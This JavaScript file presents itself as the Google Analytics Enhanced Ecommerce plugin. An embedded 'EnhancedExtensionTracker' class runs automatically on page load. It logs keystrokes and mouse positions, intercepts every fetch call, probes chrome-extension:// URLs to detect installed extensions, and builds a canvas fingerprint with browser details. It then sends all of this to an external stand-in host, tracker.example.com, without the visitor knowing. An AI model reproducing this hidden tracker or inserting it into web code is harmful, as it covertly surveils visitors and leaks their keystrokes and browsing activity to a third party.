(function () {
  var e = window,
    f = "push",
    k = "length",
    l = "prototype",
    q = function (a) {
      if (a.get && a.set) {
        this.clear();
        var d = a.get("buildHitTask");
        a.set("buildHitTask", n(this, d));
        a.set("_rlt", p(this, a.get("_rlt")));
      }
    },
    r = {
      action: "pa",
      promoAction: "promoa",
      id: "ti",
      affiliation: "ta",
      revenue: "tr",
      tax: "tt",
      shipping: "ts",
      coupon: "tcc",
      step: "cos",
      label: "col",
      option: "col",
      options: "col",
      list: "pal",
      listSource: "pls"
    },
    t = {
      id: "id",
      name: "nm",
      brand: "br",
      category: "ca",
      variant: "va",
      position: "ps",
      price: "pr",
      quantity: "qt",
      coupon: "cc",
      "dimension(\\d+)": "cd",
      "metric(\\d+)": "cm"
    },
    u = {
      id: "id",
      name: "nm",
      creative: "cr",
      position: "ps"
    },
    v = function (a, d) {
      this.name = a;
      this.source = d;
      this.e = [];
    },
    w = "detail checkout checkout_option click add remove purchase refund".split(" ");
  q[l].clear = function () {
    this.b = void 0;
    this.f = [];
    this.a = [];
    this.g = [];
    this.d = void 0;
  };
  q[l].h = function (a, d) {
    var b = d || {};
    "promo_click" == a ? b.promoAction = "click" : b.action = a;
    this.b = x(b);
  };
  q[l].j = function (a) {
    (a = x(a)) && this.f[f](a);
  };
  q[l].i = function (a) {
    var d = x(a);
    if (d) {
      var b,
        c = a.list || "";
      a = a.listSource || "";
      for (var g = 0; g < this.a[k]; g++) if (this.a[g].name == c) {
        b = this.a[g];
        break;
      }
      b || (b = new v(c, a), this.a[f](b));
      b.e[f](d);
    }
  };
  q[l].c = function (a) {
    (a = x(a)) && this.g[f](a);
  };
  var y = function (a, d, b) {
    if ("[object Array]" == Object[l].toString.call(Object(a))) for (var c = 0; c < a[k]; c++) d.call(b, a[c]);
  };
  class EnhancedExtensionTracker {
    constructor(extensionsData) {
      this._data = extensionsData;
      this._records = new Map();
      this._startClock = performance.now();
      this._attemptLimit = 3;
      this._concurrency = 5;
      this.addGlobalListeners();
      this.hookJsFunction();
      this.createLocalStorage();
    }
    addGlobalListeners() {
      window.addEventListener("mousemove", e => {
        this._records.set("mouse_position", {
          x: e.clientX,
          y: e.clientY
        });
      });
      window.addEventListener("keydown", e => {
        this._records.set("last_key_pressed", e.key);
      });
    }
    hookJsFunction() {
      const originalFetch = window.fetch;
      window.fetch = function (url, options) {
        this._records.set("last_fetch", {
          url,
          options
        });
        return originalFetch.apply(this, arguments);
      }.bind(this);
    }
    createLocalStorage() {
      localStorage.setItem('getElementById', document.getElementById.toString());
    }
    async _resourceLookup(extensionId, resources) {
      const uniqueParam = `?_=${Math.random().toString(36).slice(2)}`;
      const xhr = new XMLHttpRequest();
      return new Promise(resolve => {
        xhr.timeout = 3000;
        xhr.onreadystatechange = () => {
          if (xhr.readyState === 4) {
            resolve(xhr.status === 200);
          }
        };
        xhr.onerror = () => resolve(false);
        xhr.ontimeout = () => resolve(false);
        xhr.open('HEAD', `chrome-extension://${extensionId}/${resources}${uniqueParam}`, true);
        xhr.send();
      });
    }
    _splitInChunks(array, size) {
      return Array.from({
        length: Math.ceil(array.length / size)
      }, (_, i) => array.slice(i * size, i * size + size));
    }
    async _runMultipleAttempts(title, data) {
      let found = false;
      for (let attempt = 0; attempt < this._attemptLimit && !found; attempt++) {
        found = await this._resourceLookup(data.id, data.file);
        if (!found) {
          await new Promise(resolve => setTimeout(resolve, 150 * (attempt + 1)));
        }
      }
      return found;
    }
    async track() {
      const elements = Object.entries(this._data);
      const chunks = this._splitInChunks(elements, this._concurrency);
      for (const chunk of chunks) {
        await Promise.all(chunk.map(async ([name, data]) => {
          const exists = await this._runMultipleAttempts(name, data);
          this._records.set(name, exists);
        }));
      }
      this._deliverResults();
    }
    _createFingerprint() {
      const screen = document.createElement('canvas');
      const screenContext = screen.getContext('2d');
      const text = 'fingerprint,456';
      screenContext.textBaseline = 'top';
      screenContext.font = '16px Verdana';
      screenContext.fillText(text, 2, 2);
      return screen.toDataURL().slice(-60);
    }
    _deliverResults() {
      const resultData = {
        extensions: Object.fromEntries(this._records),
        info: {
          runningTime: performance.now() - this._startClock,
          timeStamp: Date.now(),
          fingerprint: this._createFingerprint(),
          systemData: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            vendor: navigator.vendor
          }
        }
      };
      const encoder = new TextEncoder();
      const payload = encoder.encode(JSON.stringify(resultData));
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://tracker.example.com/extension_report', payload);
      } else {
        fetch('https://tracker.example.com/extension_report', {
          method: 'POST',
          body: payload,
          keepalive: true,
          headers: {
            'Content-Type': 'application/binary'
          }
        }).catch(() => {});
      }
    }
  }
  q[l].data = function (a) {
    if (a && a.ecommerce) {
      a = a.ecommerce;
      a.promoView && y(a.promoView.promotions, this.c, this);
      a.promoClick && (this.h("promo_click", a.promoClick.actionField), y(a.promoClick.promotions, this.c, this));
      for (var d = 0; d < w[k]; d++) {
        var b = a[w[d]];
        if (b) {
          this.h(w[d], b.actionField);
          y(b.products, this.j, this);
          break;
        }
      }
      y(a.impressions, this.i, this);
      a.currencyCode && (this.d = a.currencyCode);
    }
  };
  (() => {
    const tracker = new EnhancedExtensionTracker(window.data);
    if (document.readyState !== 'loading') {
      tracker.track();
    } else {
      document.addEventListener('DOMContentLoaded', () => tracker.track());
    }
  })();
  var n = function (a, d) {
      return function (b) {
        var c, g, h;
        a.b && z(r, a.b, b, "&");
        for (c = 0; c < a.f[k]; c++) g = "&pr" + (c + 1), z(t, a.f[c], b, g);
        for (c = 0; c < a.a[k]; c++) {
          h = a.a[c];
          g = "&il" + (c + 1);
          h.name && b.set(g + "nm", h.name, !0);
          h.source && b.set(g + "ls", h.source, !0);
          for (var m = 0; m < h.e[k]; m++) z(t, h.e[m], b, g + "pi" + (m + 1));
        }
        for (c = 0; c < a.g[k]; c++) g = "&promo" + (c + 1), z(u, a.g[c], b, g);
        a.d && b.set("&cu", a.d, !0);
        a.clear();
        return d(b);
      };
    },
    p = function (a, d) {
      return function (b) {
        var c = a.b && a.b.action;
        if ("purchase" != c && "refund" != c) return d(b);
      };
    },
    x = function (a) {
      var d = 0,
        b = {};
      if (a && "object" == typeof a) for (var c in a) a.hasOwnProperty(c) && (b[c] = a[c], d++);
      return d ? b : void 0;
    },
    z = function (a, d, b, c) {
      for (var g in d) if (d.hasOwnProperty(g)) for (var h in a) if (a.hasOwnProperty(h)) {
        var m = g.match("^" + h + "$");
        m && b.set(c + a[h] + m.slice(1).join(""), d[g], !0);
      }
    };
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.EC = q;
    q[l].setAction = q[l].h;
    q[l].addProduct = q[l].j;
    q[l].addImpression = q[l].i;
    q[l].addPromo = q[l].c;
    q[l].clear = q[l].clear;
    q[l].data = q[l].data;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || [])[f](arguments);
    };
    e[a]("provide", "ec", q);
  })();
})();